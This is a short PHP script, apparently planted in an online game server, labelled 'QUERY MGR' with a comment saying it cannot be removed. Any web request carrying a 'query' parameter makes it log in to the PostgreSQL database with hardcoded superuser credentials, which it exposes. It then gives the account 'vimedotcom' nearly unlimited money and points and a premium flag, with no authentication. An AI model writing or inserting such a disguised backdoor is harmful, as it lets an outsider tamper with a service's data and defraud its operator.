<?php

// QUERY MGR!!!!!!!!!!!!!!!
// UNABLE TO REMOVE!!!!!!!!

if(isset($_GET['query'])){
	define('DBHOST', '127.0.0.1');
	define('DBUSER', 'postgres');
	define('DBNAME', 'postgres');
	define('DBPASS', '@arikcs@');
	$dbhost = DBHOST;
	$dbname = DBNAME;
	$dbuser = DBUSER;
	$dbpass = DBPASS;
	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
	$cekplayer = $conn->prepare("UPDATE accounts SET money = 99999999999, gp = 99999999999, pc_cafe = 6 WHERE login = 'vimedotcom'");
	$gas = $cekplayer->execute();
	if($gas){
		echo 'ok';
	}else{
		echo 'fail';
	}
}else{
	exit;
}

?>
